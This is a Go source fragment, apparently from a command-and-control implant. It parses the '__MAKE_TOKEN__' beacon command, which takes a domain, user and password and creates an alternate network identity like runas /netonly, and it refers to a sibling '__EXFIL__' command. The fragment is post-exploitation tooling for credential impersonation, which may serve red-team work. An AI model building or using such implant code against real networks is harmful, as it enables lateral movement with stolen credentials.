package main

import (
	"encoding/json"
	"errors"
	"strings"
)

// makeTokenPayload carries the alternate network identity. It travels as a
// JSON body on the __MAKE_TOKEN__ beacon command, mirroring __EXFIL__, so a
// password with spaces or special characters never needs shell quoting.
type makeTokenPayload struct {
	Domain   string `json:"domain"`
	User     string `json:"user"`
	Password string `json:"password"`
}

// parseMakeTokenPayload extracts the identity fields without logging them.
// A combined DOMAIN\user value is split so every caller can pass one string.
func parseMakeTokenPayload(command string) (makeTokenPayload, error) {
	var payload makeTokenPayload
	parts := strings.SplitN(command, "\n", 2)
	if len(parts) != 2 || strings.TrimSpace(parts[1]) == "" {
		return payload, errors.New("missing JSON payload")
	}
	if err := json.Unmarshal([]byte(parts[1]), &payload); err != nil {
		return payload, err
	}
	payload.Domain = strings.TrimSpace(payload.Domain)
	payload.User = strings.TrimSpace(payload.User)
	if payload.Domain == "" && strings.Contains(payload.User, `\`) {
		payload.Domain, payload.User, _ = strings.Cut(payload.User, `\`)
		payload.Domain = strings.TrimSpace(payload.Domain)
		payload.User = strings.TrimSpace(payload.User)
	}
	if payload.User == "" {
		return payload, errors.New("user is required")
	}
	return payload, nil
}

// makeTokenCommand handles __MAKE_TOKEN__: create the alternate network
// identity used by subsequent spawned operator commands, with the same
// semantics as runas /netonly. Credentials are never logged or echoed.
func makeTokenCommand(command string) (string, error) {
	payload, err := parseMakeTokenPayload(command)
	if err != nil {
		return "", err
	}
	return makeTokenAction(payload.Domain, payload.User, payload.Password)
}
